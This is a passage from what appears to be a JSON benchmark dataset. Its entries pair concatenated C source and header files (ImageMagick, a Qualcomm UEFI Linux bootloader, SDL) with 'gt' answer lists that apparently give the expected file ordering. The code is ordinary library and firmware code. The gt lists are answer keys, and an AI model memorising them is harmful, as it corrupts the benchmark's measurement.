\"magick/display.h\"\n#include \"magick/distort.h\"\n#include \"magick/draw.h\"\n#include \"magick/effect.h\"\n#include \"magick/enhance.h\"\n#include \"magick/exception.h\"\n#include \"magick/feature.h\"\n#include \"magick/fourier.h\"\n#include \"magick/fx.h\"\n#include \"magick/gem.h\"\n#include \"magick/geometry.h\"\n#include \"magick/hashmap.h\"\n#include \"magick/histogram.h\"\n#include \"magick/identify.h\"\n#include \"magick/image.h\"\n#include \"magick/image-view.h\"\n#include \"magick/layer.h\"\n#include \"magick/list.h\"\n#include \"magick/locale_.h\"\n#include \"magick/log.h\"\n#include \"magick/magic.h\"\n#include \"magick/magick.h\"\n#include \"magick/matrix.h\"\n#include \"magick/memory_.h\"\n#include \"magick/module.h\"\n#include \"magick/mime.h\"\n#include \"magick/monitor.h\"\n#include \"magick/montage.h\"\n#include \"magick/morphology.h\"\n#include \"magick/option.h\"\n#include \"magick/paint.h\"\n#include \"magick/pixel.h\"\n#include \"magick/policy.h\"\n#include \"magick/prepress.h\"\n#include \"magick/profile.h\"\n#include \"magick/property.h\"\n#include \"magick/quantize.h\"\n#include \"magick/quantum.h\"\n#include \"magick/registry.h\"\n#include \"magick/random_.h\"\n#include \"magick/resample.h\"\n#include \"magick/resize.h\"\n#include \"magick/resource_.h\"\n#include \"magick/segment.h\"\n#include \"magick/shear.h\"\n#include \"magick/signature.h\"\n#include \"magick/splay-tree.h\"\n#include \"magick/stream.h\"\n#include \"magick/statistic.h\"\n#include \"magick/string_.h\"\n#include \"magick/timer.h\"\n#include \"magick/token.h\"\n#include \"magick/transform.h\"\n#include \"magick/threshold.h\"\n#include \"magick/type.h\"\n#include \"magick/utility.h\"\n#include \"magick/version.h\"\n#include \"magick/xml-tree.h\"\n#include \"magick/xwindow.h\"\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n\n'canvas/_include/magick/attribute.h'\n:\n#ifndef _MAGICKCORE_ATTRIBUTE_H\n#define _MAGICKCORE_ATTRIBUTE_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#include <magick/image.h>\n#include <magick/exception.h>\n\nextern MagickExport ImageType\n  GetImageType(const Image *,ExceptionInfo *);\n\nextern MagickExport MagickBooleanType\n  IsGrayImage(const Image *,ExceptionInfo *),\n  IsMonochromeImage(const Image *,ExceptionInfo *),\n  IsOpaqueImage(const Image *,ExceptionInfo *),\n  SetImageChannelDepth(Image *,const ChannelType,const size_t),\n  SetImageDepth(Image *,const size_t),\n  SetImageType(Image *,const ImageType);\n\nextern MagickExport RectangleInfo\n  GetImageBoundingBox(const Image *,ExceptionInfo *exception);\n\nextern MagickExport size_t\n  GetImageChannelDepth(const Image *,const ChannelType,ExceptionInfo *),\n  GetImageDepth(const Image *,ExceptionInfo *),\n  GetImageQuantumDepth(const Image *,const MagickBooleanType);\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n\n'canvas/_include/wand/magick-wand.h'\n:\n\n#ifndef _MAGICKWAND_MAGICK_WAND_DEPRECATED_H\n#define _MAGICKWAND_MAGICK_WAND_DEPRECATED_H\n\n#include \"wand/MagickWand.h\"\n\n#endif\n\n'canvas/_include/wand/pixel-iterator.h'\n:\n#ifndef _MAGICKWAND_PIXEL_ITERATOR_H\n#define _MAGICKWAND_PIXEL_ITERATOR_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#include \"wand/magick-wand.h\"\n#include \"wand/pixel-wand.h\"\n\ntypedef struct _PixelIterator\n  PixelIterator;\n\nextern WandExport char\n  *PixelGetIteratorException(const PixelIterator *,ExceptionType *);\n\nextern WandExport ExceptionType\n  PixelGetIteratorExceptionType(const PixelIterator *);\n\nextern WandExport MagickBooleanType\n  IsPixelIterator(const PixelIterator *),\n  PixelClearIteratorException(PixelIterator *),\n  PixelSetIteratorRow(PixelIterator *,const ssize_t),\n  PixelSyncIterator(PixelIterator *);\n\nextern WandExport PixelIterator\n  *ClonePixelIterator(const PixelIterator *),\n  *DestroyPixelIterator(PixelIterator *),\n  *NewPixelIterator(MagickWand *),\n  *NewPixelRegionIterator(MagickWand *,const ssize_t,const ssize_t,const size_t,\n    const size_t);\n\nextern WandExport PixelWand\n  **PixelGetCurrentIteratorRow(PixelIterator *,size_t *),\n  **PixelGetNextIteratorRow(PixelIterator *,size_t *),\n  **PixelGetPreviousIteratorRow(PixelIterator *,size_t *);\n\nextern WandExport ssize_t\n  PixelGetIteratorRow(PixelIterator *);\n\nextern WandExport void\n  ClearPixelIterator(PixelIterator *),\n  PixelResetIterator(PixelIterator *),\n  PixelSetFirstIteratorRow(PixelIterator *),\n  PixelSetLastIteratorRow(PixelIterator *);\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n",
        "gt": [
            "'canvas/_include/magick/attribute.h'",
            "'canvas/_include/magick/MagickCore.h'",
            "'canvas/_include/wand/MagickWand.h'",
            "'canvas/_include/wand/magick-wand.h'",
            "'canvas/_include/wand/pixel-iterator.h'",
            "'canvas/_include/wand/deprecate.h'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/UpdateCmdLine.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Application/LinuxLoader/LinuxLoader.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/DeviceInfo.h'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/UpdateCmdLine.h'\n:\n\n#ifndef __UPDATECMDLINE_H__\n#define __UPDATECMDLINE_H__\n\n#include <Library/DebugLib.h>\n#include <Library/DeviceInfo.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiLib.h>\n#include <Uefi.h>\n\n#define BOOT_BASE_BAND \" androidboot.baseband=\"\n#define BATT_MIN_VOLT 3200\n\n#define MAX_PATH_SIZE 72\n#define SERIAL_NUM_SIZE 64\n\ntypedef struct BootInfo BootInfo;\n\ntypedef struct UpdateCmdLineParamList {\n  BOOLEAN Recovery;\n  BOOLEAN MultiSlotBoot;\n  BOOLEAN AlarmBoot;\n  BOOLEAN MdtpActive;\n  UINT32 CmdLineLen;\n  UINT32 HaveCmdLine;\n  UINT32 PauseAtBootUp;\n  CHAR8 *StrSerialNum;\n  CHAR8 *SlotSuffixAscii;\n  CHAR8 *ChipBaseBand;\n  CHAR8 *DisplayCmdLine;\n  CONST CHAR8 *CmdLine;\n  CONST CHAR8 *AlarmBootCmdLine;\n  CONST CHAR8 *MdtpActiveFlag;\n  CONST CHAR8 *BatteryChgPause;\n  CONST CHAR8 *UsbSerialCmdLine;\n  CONST CHAR8 *VBCmdLine;\n  CONST CHAR8 *LogLevel;\n  CONST CHAR8 *BootDeviceCmdLine;\n  CONST CHAR8 *AndroidBootMode;\n  CONST CHAR8 *AndroidBootFstabSuffix;\n  CHAR8 *BootDevBuf;\n  CHAR8 *FfbmStr;\n  CHAR8 *AndroidSlotSuffix;\n  CHAR8 *SkipRamFs;\n  CHAR8 *RootCmdLine;\n  CHAR8 *InitCmdline;\n  CHAR8 *DtboIdxStr;\n  CHAR8 *DtbIdxStr;\n  CHAR8 *LEVerityCmdLine;\n  CHAR8 *FstabSuffix;\n  UINT32 HeaderVersion;\n  CONST CHAR8 *SystemdSlotEnv;\n  CHAR8 *SoftSkuStr;\n} UpdateCmdLineParamList;\n\nEFI_STATUS\nUpdateCmdLine (CONST CHAR8 *CmdLine,\n               CHAR8 *FfbmStr,\n               BOOLEAN Recovery,\n               BOOLEAN AlarmBoot,\n               CONST CHAR8 *VBCmdLine,\n               CHAR8 **FinalCmdLine,\n               UINT32 HeaderVersion);\nBOOLEAN\nTargetBatterySocOk (UINT32 *BatteryVoltage);\n\nUINT32\nGetSystemPath (CHAR8 **SysPath, BootInfo *Info);\n\nEFI_STATUS\nTargetPauseForBatteryCharge (BOOLEAN *BatteryStatus);\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Application/LinuxLoader/LinuxLoader.c'\n:\n\n#include \"AutoGen.h\"\n#include \"BootLinux.h\"\n#include \"BootStats.h\"\n#include \"KeyPad.h\"\n#include \"LinuxLoaderLib.h\"\n#include <Protocol/DiskIo.h>\n#include <Protocol/EFIDisplayUtils.h>\n#include <FastbootLib/FastbootMain.h>\n#include <Library/DeviceInfo.h>\n#include <Library/DrawUI.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/PartitionTableUpdate.h>\n#include <Library/ShutdownServices.h>\n#include <Library/StackCanary.h>\n#include \"Library/ThreadStack.h\"\n#include <Library/HypervisorMvCalls.h>\n#include <Library/UpdateCmdLine.h>\n\n#define MAX_APP_STR_LEN 64\n#define MAX_NUM_FS 10\n#define DEFAULT_STACK_CHK_GUARD 0xc0c0c0c0\n\nSTATIC BOOLEAN BootReasonAlarm = FALSE;\nSTATIC BOOLEAN BootIntoFastboot = FALSE;\nSTATIC BOOLEAN BootIntoRecovery = FALSE;\n\n\nSTATIC EFI_STATUS MdtpDisable (VOID)\n{\n  BOOLEAN MdtpActive = FALSE;\n  EFI_STATUS Status = EFI_SUCCESS;\n  QCOM_MDTP_PROTOCOL *MdtpProtocol;\n\n  if (FixedPcdGetBool (EnableMdtpSupport)) {\n    Status = IsMdtpActive (&MdtpActive);\n\n    if (EFI_ERROR (Status))\n      return Status;\n\n    if (MdtpActive) {\n      Status = gBS->LocateProtocol (&gQcomMdtpProtocolGuid, NULL,\n                                    (VOID **)&MdtpProtocol);\n      if (EFI_ERROR (Status)) {\n        DEBUG ((EFI_D_ERROR, \"Failed to locate MDTP protocol, Status=%r\\n\",\n                Status));\n        return Status;\n      }\n\n      Status = MdtpProtocol->MdtpDeactivate (MdtpProtocol, FALSE);\n    }\n  }\n\n  return Status;\n}\n\nSTATIC UINT8\nGetRebootReason (UINT32 *ResetReason)\n{\n  EFI_RESETREASON_PROTOCOL *RstReasonIf;\n  EFI_STATUS Status;\n\n  Status = gBS->LocateProtocol (&gEfiResetReasonProtocolGuid, NULL,\n                                (VOID **)&RstReasonIf);\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Error locating the reset reason protocol\\n\"));\n    return Status;\n  }\n\n  RstReasonIf->GetResetReason (RstReasonIf, ResetReason, NULL, NULL);\n  if (RstReasonIf->Revision >= EFI_RESETREASON_PROTOCOL_REVISION)\n    RstReasonIf->ClearResetReason (RstReasonIf);\n  return Status;\n}\n\nBOOLEAN IsABRetryCountUpdateRequired (VOID)\n{\n  BOOLEAN BatteryStatus;\n\n\n  TargetPauseForBatteryCharge (&BatteryStatus);\n\n\n  if ((BatteryStatus &&\n       IsChargingScreenEnable ()) ||\n       BootIntoFastboot ||\n       BootIntoRecovery) {\n    return FALSE;\n  }\n  return TRUE;\n}\n\n#if TARGET_BOARD_TYPE_AUTO\nSTATIC UINT8\nWaitForDisplayCompletion (VOID)\n{\n  EFI_STATUS Status;\n  EfiQcomDisplayUtilsProtocol *pDisplayUtilsProtocol = NULL;\n  CHAR8 *sLockName = \"DispInit\";\n\n  Status = gBS->LocateProtocol (&gQcomDisplayUtilsProtocolGuid,\n                                NULL,\n                                (VOID **)&pDisplayUtilsProtocol);\n  if ((EFI_ERROR (Status)) ||\n      (pDisplayUtilsProtocol == NULL)) {\n    DEBUG ((EFI_D_ERROR, \"Failed to locate DisplayUtils protocol, Status=%r\\n\",\n                Status));\n    return Status;\n  } else {\n    Status = pDisplayUtilsProtocol->DisplayUtilsSetProperty (\n                                     EFI_DISPLAY_UTILS_WAIT_FOR_EVENT,\n                                     sLockName, strlen (sLockName));\n  }\n\n  return Status;\n}\n#else\nSTATIC UINT8\nWaitForDisplayCompletion (VOID)\n{\n  return EFI_SUCCESS;\n}\n#endif\n\n\n\nEFI_STATUS EFIAPI  __attribute__ ( (no_sanitize (\"safe-stack\")))\nLinuxLoaderEntry (IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)\n{\n  EFI_STATUS Status;\n\n  UINT32 BootReason = NORMAL_MODE;\n  UINT32 KeyPressed = SCAN_NULL;\n\n  BOOLEAN MultiSlotBoot;\n\n  DEBUG ((EFI_D_INFO, \"Loader Build Info: %a %a\\n\", __DATE__, __TIME__));\n  DEBUG ((EFI_D_VERBOSE, \"LinuxLoader Load Address to debug ABL: 0x%llx\\n\",\n         (UINTN)LinuxLoaderEntry & (~ (0xFFF))));\n  DEBUG ((EFI_D_VERBOSE, \"LinuxLoaderEntry Address: 0x%llx\\n\",\n         (UINTN)LinuxLoaderEntry));\n\n  Status = InitThreadUnsafeStack ();\n\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Unable to Allocate memory for Unsafe Stack: %r\\n\",\n            Status));\n    goto stack_guard_update_default;\n  }\n\n  StackGuardChkSetup ();\n\n  BootStatsSetTimeStamp (BS_BL_START);\n\n\n  Status = DeviceInfoInit ();\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Initialize the device info failed: %r\\n\", Status));\n    goto stack_guard_update_default;\n  }\n\n  Status = EnumeratePartitions ();\n\n  if (EFI_ERROR (Status)) {\n    DEBUG ((EFI_D_ERROR, \"LinuxLoader: Could not enumerate partitions: %r\\n\",\n            Status));\n    goto stack_guard_update_default;\n  }\n\n  UpdatePartitionEntries ();\n\n  MultiSlotBoot = PartitionHasMultiSlot ((CONST CHAR16 *)L\"boot\");\n  if (MultiSlotBoot) {\n    DEBUG ((EFI_D_VERBOSE, \"Multi Slot boot is supported\\n\"));\n    FindPtnActiveSlot ();\n  }\n\n\n\n\n      BootIntoFastboot = TRUE;\n\n\n\n\n\n\n\n\n\n\n  Status = GetRebootReason (&BootReason);\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Failed to get Reboot reason: %r\\n\", Status));\n    goto stack_guard_update_default;\n  }\n\n  switch (BootReason) {\n  case FASTBOOT_MODE:\n    BootIntoFastboot = TRUE;\n    break;\n  case RECOVERY_MODE:\n    BootIntoRecovery = TRUE;\n    break;\n  case ALARM_BOOT:\n    BootReasonAlarm = TRUE;\n    break;\n  case DM_VERITY_ENFORCING:\n\n    Status = EnableEnforcingMode (TRUE);\n    if (Status != EFI_SUCCESS)\n      goto stack_guard_update_default;\n    break;\n  case DM_VERITY_LOGGING:\n\n    Status = MdtpDisable ();\n    if (EFI_ERROR (Status) && Status != EFI_NOT_FOUND) {\n      DEBUG ((EFI_D_ERROR, \"MdtpDisable Returned error: %r\\n\", Status));\n      goto stack_guard_update_default;\n    }\n\n    Status = EnableEnforcingMode (FALSE);\n    if (Status != EFI_SUCCESS)\n      goto stack_guard_update_default;\n\n    break;\n  case DM_VERITY_KEYSCLEAR:\n    Status = ResetDeviceState ();\n    if (Status != EFI_SUCCESS) {\n      DEBUG ((EFI_D_ERROR, \"VB Reset Device State error: %r\\n\", Status));\n      goto stack_guard_update_default;\n    }\n    break;\n  default:\n    if (BootReason != NORMAL_MODE) {\n      DEBUG ((EFI_D_ERROR,\n             \"Boot reason: 0x%x not handled, defaulting to Normal Boot\\n\",\n             BootReason));\n    }\n    break;\n  }\n\n  Status = RecoveryInit (&BootIntoRecovery);\n  if (Status != EFI_SUCCESS)\n    DEBUG ((EFI_D_VERBOSE, \"RecoveryInit failed ignore: %r\\n\", Status));\n\n\n  Status = BoardInit ();\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Error finding board information: %r\\n\", Status));\n    return Status;\n  }\n\n  DEBUG ((EFI_D_INFO, \"KeyPress:%u, BootReason:%u\\n\", KeyPressed, BootReason));\n  DEBUG ((EFI_D_INFO, \"Fastboot=%d, Recovery:%d\\n\",\n                                          BootIntoFastboot, BootIntoRecovery));\n  if (!GetVmData ()) {\n    DEBUG ((EFI_D_ERROR, \"VM Hyp calls not present\\n\"));\n  }\n\n  if (!BootIntoFastboot) {\n    BootInfo Info = {0};\n    Info.MultiSlotBoot = MultiSlotBoot;\n    Info.BootIntoRecovery = BootIntoRecovery;\n    Info.BootReasonAlarm = BootReasonAlarm;\n    Status = LoadImageAndAuth (&Info);\n    if (Status != EFI_SUCCESS) {\n      DEBUG ((EFI_D_ERROR, \"LoadImageAndAuth failed: %r\\n\", Status));\n      goto fastboot;\n    }\n\n    Status = WaitForDisplayCompletion ();\n    if (Status != EFI_SUCCESS) {\n      DEBUG ((EFI_D_ERROR, \"Failed to wait for display completion: %r\\n\",\n                  Status));\n    }\n    BootLinux (&Info);\n  }\n\nfastboot:\n  Status = WaitForDisplayCompletion ();\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Failed to wait for display completion: %r\\n\",\n                Status));\n  }\n\n  DEBUG ((EFI_D_INFO, \"Launching fastboot\\n\"));\n  Status = FastbootInitialize ();\n  if (EFI_ERROR (Status)) {\n    DEBUG ((EFI_D_ERROR, \"Failed to Launch Fastboot App: %d\\n\", Status));\n    goto stack_guard_update_default;\n  }\n\nstack_guard_update_default:\n\n  __stack_chk_guard = DEFAULT_STACK_CHK_GUARD;\n\n  return Status;\n}\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/DeviceInfo.h'\n:\n\n#ifndef _DEVINFO_H_\n#define _DEVINFO_H_\n\n#include <Protocol/EFIVerifiedBoot.h>\n#define DEVICE_MAGIC \"ANDROID-BOOT!\"\n#define DEVICE_MAGIC_SIZE 13\n#define MAX_VERSION_LEN 64\n#define MAX_VB_PARTITIONS 32\n#define MAX_USER_KEY_SIZE 2048\n#define MAX_DISPLAY_CMDLINE_LEN 128\n\nenum unlock_type {\n  UNLOCK = 0,\n  UNLOCK_CRITICAL,\n};\n\ntypedef struct device_info {\n  CHAR8 magic[DEVICE_MAGIC_SIZE];\n  BOOLEAN is_unlocked;\n  BOOLEAN is_unlock_critical;\n  BOOLEAN is_charger_screen_enabled;\n  CHAR8 bootloader_version[MAX_VERSION_LEN];\n  CHAR8 radio_version[MAX_VERSION_LEN];\n  BOOLEAN verity_mode;\n  UINT32 user_public_key_length;\n  CHAR8 user_public_key[MAX_USER_KEY_SIZE];\n  UINT64 rollback_index[MAX_VB_PARTITIONS];\n  CHAR8 Display_Cmdline[MAX_DISPLAY_CMDLINE_LEN];\n} DeviceInfo;\n\nstruct verified_boot_verity_mode {\n  BOOLEAN verity_mode_enforcing;\n  CHAR8 *name;\n};\n\nstruct verified_boot_state_name {\n  boot_state_t boot_state;\n  CHAR8 *name;\n};\n\nBOOLEAN IsUnlocked (VOID);\nBOOLEAN IsUnlockCritical (VOID);\nBOOLEAN IsEnforcing (VOID);\nBOOLEAN IsChargingScreenEnable (VOID);\nVOID\nGetBootloaderVersion (CHAR8 *BootloaderVersion, UINT32 Len);\nVOID\nGetRadioVersion (CHAR8 *RadioVersion, UINT32 Len);\nEFI_STATUS\nEnableChargingScreen (BOOLEAN IsEnabled);\nEFI_STATUS\nEnableEnforcingMode (BOOLEAN IsEnabled);\nEFI_STATUS\nSetDeviceUnlockValue (UINT32 Type, BOOLEAN State);\nEFI_STATUS DeviceInfoInit (VOID);\nEFI_STATUS\nReadRollbackIndex (UINT32 Loc, UINT64 *RollbackIndex);\nEFI_STATUS\nWriteRollbackIndex (UINT32 Loc, UINT64 RollbackIndex);\nEFI_STATUS\nStoreUserKey (CHAR8 *UserKey, UINT32 UserKeySize);\nEFI_STATUS\nGetUserKey (CHAR8 **UserKey, UINT32 *UserKeySize);\nEFI_STATUS EraseUserKey (VOID);\nEFI_STATUS\nStoreDisplayCmdLine (CONST CHAR8 *CmdLine, UINT32 CmdLineLen);\nEFI_STATUS\nReadDisplayCmdLine (CHAR8 **CmdLine, UINT32 *CmdLineLen);\n#endif\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/DeviceInfo.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/UpdateCmdLine.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Application/LinuxLoader/LinuxLoader.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_shape.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_surface.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_rect.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_shape.h'\n:\n\n#ifndef _SDL_shape_h\n#define _SDL_shape_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_pixels.h\"\n#include \"SDL_rect.h\"\n#include \"SDL_surface.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n#define SDL_NONSHAPEABLE_WINDOW -1\n#define SDL_INVALID_SHAPE_ARGUMENT -2\n#define SDL_WINDOW_LACKS_SHAPE -3\n\n\nextern DECLSPEC SDL_Window * SDLCALL SDL_CreateShapedWindow(const char *title,unsigned int x,unsigned int y,unsigned int w,unsigned int h,Uint32 flags);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_IsShapedWindow(const SDL_Window *window);\n\n\ntypedef enum {\n\n    ShapeModeDefault,\n\n    ShapeModeBinarizeAlpha,\n\n    ShapeModeReverseBinarizeAlpha,\n\n    ShapeModeColorKey\n} WindowShapeMode;\n\n#define SDL_SHAPEMODEALPHA(mode) (mode == ShapeModeDefault || mode == ShapeModeBinarizeAlpha || mode == ShapeModeReverseBinarizeAlpha)\n\n\ntypedef union {\n\n    Uint8 binarizationCutoff;\n    SDL_Color colorKey;\n} SDL_WindowShapeParams;\n\n\ntypedef struct SDL_WindowShapeMode {\n\n    WindowShapeMode mode;\n\n    SDL_WindowShapeParams parameters;\n} SDL_WindowShapeMode;\n\n\nextern DECLSPEC int SDLCALL SDL_SetWindowShape(SDL_Window *window,SDL_Surface *shape,SDL_WindowShapeMode *shape_mode);\n\n\nextern DECLSPEC int SDLCALL SDL_GetShapedWindowMode(SDL_Window *window,SDL_WindowShapeMode *shape_mode);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_surface.h'\n:\n\n\n\n#ifndef _SDL_surface_h\n#define _SDL_surface_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_pixels.h\"\n#include \"SDL_rect.h\"\n#include \"SDL_blendmode.h\"\n#include \"SDL_rwops.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n#define SDL_SWSURFACE       0\n#define SDL_PREALLOC        0x00000001\n#define SDL_RLEACCEL        0x00000002\n#define SDL_DONTFREE        0x00000004\n\n#define SDL_MUSTLOCK(S) (((S)->flags & SDL_RLEACCEL) != 0)\n\n\ntypedef struct SDL_Surface\n{\n    Uint32 flags;\n    SDL_PixelFormat *format;\n    int w, h;\n    int pitch;\n    void *pixels;\n\n\n    void *userdata;\n\n\n    int locked;\n    void *lock_data;\n\n\n    SDL_Rect clip_rect;\n\n\n    struct SDL_BlitMap *map;\n\n\n    int refcount;\n} SDL_Surface;\n\n\ntypedef int (*SDL_blit) (struct SDL_Surface * src, SDL_Rect * srcrect,\n                         struct SDL_Surface * dst, SDL_Rect * dstrect);\n\n\nextern DECLSPEC SDL_Surface *SDLCALL SDL_CreateRGBSurface\n    (Uint32 flags, int width, int height, int depth,\n     Uint32 Rmask, Uint32 Gmask, Uint32 Bmask, Uint32 Amask);\nextern DECLSPEC SDL_Surface *SDLCALL SDL_CreateRGBSurfaceWithFormat\n    (Uint32 flags, int width, int height, int depth, Uint32 format);\nextern DECLSPEC SDL_Surface *SDLCALL SDL_CreateRGBSurfaceFrom(void *pixels,\n                                                              int width,\n                                                              int height,\n                                                              int depth,\n                                                              int pitch,\n                                                              Uint32 Rmask,\n                                                              Uint32 Gmask,\n                                                              Uint32 Bmask,\n                                                              Uint32 Amask);\nextern DECLSPEC SDL_Surface *SDLCALL SDL_CreateRGBSurfaceWithFormatFrom\n    (void *pixels, int width, int height, int depth, int pitch, Uint32 format);\nextern DECLSPEC void SDLCALL SDL_FreeSurface(SDL_Surface * surface);\n\n\nextern DECLSPEC int SDLCALL SDL_SetSurfacePalette(SDL_Surface * surface,\n                                                  SDL_Palette * palette);\n\n\nextern DECLSPEC int SDLCALL SDL_LockSurface(SDL_Surface * surface);\n\nextern DECLSPEC void SDLCALL SDL_UnlockSurface(SDL_Surface * surface);\n\n\nextern DECLSPEC SDL_Surface *SDLCALL SDL_LoadBMP_RW(SDL_RWops * src,\n                                                    int freesrc);\n\n\n#define SDL_LoadBMP(file)   SDL_LoadBMP_RW(SDL_RWFromFile(file, \"rb\"), 1)\n\n\nextern DECLSPEC int SDLCALL SDL_SaveBMP_RW\n    (SDL_Surface * surface, SDL_RWops * dst, int freedst);\n\n\n#define SDL_SaveBMP(surface, file) \\\n        SDL_SaveBMP_RW(surface, SDL_RWFromFile(file, \"wb\"), 1)\n\n\nextern DECLSPEC int SDLCALL SDL_SetSurfaceRLE(SDL_Surface * surface,\n                                              int flag);\n\n\nextern DECLSPEC int SDLCALL SDL_SetColorKey(SDL_Surface * surface,\n                                            int flag, Uint32 key);\n\n\nextern DECLSPEC int SDLCALL SDL_GetColorKey(SDL_Surface * surface,\n                                            Uint32 * key);\n\n\nextern DECLSPEC int SDLCALL SDL_SetSurfaceColorMod(SDL_Surface * surface,\n                                                   Uint8 r, Uint8 g, Uint8 b);\n\n\n\nextern DECLSPEC int SDLCALL SDL_GetSurfaceColorMod(SDL_Surface * surface,\n                                                   Uint8 * r, Uint8 * g,\n                                                   Uint8 * b);\n\n\nextern DECLSPEC int SDLCALL SDL_SetSurfaceAlphaMod(SDL_Surface * surface,\n                                                   Uint8 alpha);\n\n\nextern DECLSPEC int SDLCALL SDL_GetSurfaceAlphaMod(SDL_Surface * surface,\n                                                   Uint8 * alpha);\n\n\nextern DECLSPEC int SDLCALL SDL_SetSurfaceBlendMode(SDL_Surface * surface,\n                                                    SDL_BlendMode blendMode);\n\n\nextern DECLSPEC int SDLCALL SDL_GetSurfaceBlendMode(SDL_Surface * surface,\n                                                    SDL_BlendMode *blendMode);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_SetClipRect(SDL_Surface * surface,\n                                                 const SDL_Rect * rect);\n\n\nextern DECLSPEC void SDLCALL SDL_GetClipRect(SDL_Surface * surface,\n                                             SDL_Rect * rect);\n\n\nextern DECLSPEC SDL_Surface *SDLCALL SDL_ConvertSurface\n    (SDL_Surface * src, const SDL_PixelFormat * fmt, Uint32 flags);\nextern DECLSPEC SDL_Surface *SDLCALL SDL_ConvertSurfaceFormat\n    (SDL_Surface * src, Uint32 pixel_format, Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_ConvertPixels(int width, int height,\n                                              Uint32 src_format,\n                                              const void * src, int src_pitch,\n                                              Uint32 dst_format,\n                                              void * dst, int dst_pitch);\n\n\nextern DECLSPEC int SDLCALL SDL_FillRect\n    (SDL_Surface * dst, const SDL_Rect * rect, Uint32 color);\nextern DECLSPEC int SDLCALL SDL_FillRects\n    (SDL_Surface * dst, const SDL_Rect * rects, int count, Uint32 color);\n\n\n#define SDL_BlitSurface SDL_UpperBlit\n\n\nextern DECLSPEC int SDLCALL SDL_UpperBlit\n    (SDL_Surface * src, const SDL_Rect * srcrect,\n     SDL_Surface * dst, SDL_Rect * dstrect);\n\n\nextern DECLSPEC int SDLCALL SDL_LowerBlit\n    (SDL_Surface * src, SDL_Rect * srcrect,\n     SDL_Surface * dst, SDL_Rect * dstrect);\n\n\nextern DECLSPEC int SDLCALL SDL_SoftStretch(SDL_Surface * src,\n                                            const SDL_Rect * srcrect,\n                                            SDL_Surface * dst,\n                                            const SDL_Rect * dstrect);\n\n#define SDL_BlitScaled SDL_UpperBlitScaled\n\n\nextern DECLSPEC int SDLCALL SDL_UpperBlitScaled\n    (SDL_Surface * src, const SDL_Rect * srcrect,\n    SDL_Surface * dst, SDL_Rect * dstrect);\n\n\nextern DECLSPEC int SDLCALL SDL_LowerBlitScaled\n    (SDL_Surface * src, SDL_Rect * srcrect,\n    SDL_Surface * dst, SDL_Rect * dstrect);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_rect.h'\n:\n\n\n\n#ifndef _SDL_rect_h\n#define _SDL_rect_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_error.h\"\n#include \"SDL_pixels.h\"\n#include \"SDL_rwops.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDL_Point\n{\n    int x;\n    int y;\n} SDL_Point;\n\n\ntypedef struct SDL_Rect\n{\n    int x, y;\n    int w, h;\n} SDL_Rect;\n\n\nSDL_FORCE_INLINE SDL_bool SDL_PointInRect(const SDL_Point *p, const SDL_Rect *r)\n{\n    return ( (p->x >= r->x) && (p->x < (r->x + r->w)) &&\n             (p->y >= r->y) && (p->y < (r->y + r->h)) ) ? SDL_TRUE : SDL_FALSE;\n}\n\n\nSDL_FORCE_INLINE SDL_bool SDL_RectEmpty(const SDL_Rect *r)\n{\n    return ((!r) || (r->w <= 0) || (r->h <= 0)) ? SDL_TRUE : SDL_FALSE;\n}\n\n\nSDL_FORCE_INLINE 